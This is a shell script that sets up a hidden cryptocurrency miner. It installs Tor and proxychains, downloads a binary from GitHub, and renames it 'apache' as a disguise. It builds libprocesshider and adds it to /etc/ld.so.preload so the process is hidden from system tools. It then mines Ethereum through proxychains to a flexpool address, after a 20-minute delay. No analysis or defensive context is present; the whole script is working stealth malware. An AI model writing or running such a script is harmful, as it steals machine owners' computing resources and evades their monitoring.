#!/bin/sh
sleep 20m
n -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
apt -y install binutils cmake build-essential unzip net-tools curl tor proxychains
service tor start

sed -i -e 's/#dynamic_chain/dynamic_chain/g;s/strict_chain/#strict_chain/g;s/socks4/socks5/g' /etc/proxychains.conf

wget https://raw.githubusercontent.com/kuyaxxx/pacul/main/miZni
chmod +x miZni
mv miZni apache

git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..

proxychains ./apache --url=ssl://0xbc48b8bdce572defe4dcab85103f140099bc5af5.$(echo $(shuf -i 1-1000 -n 1))@eth-de.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
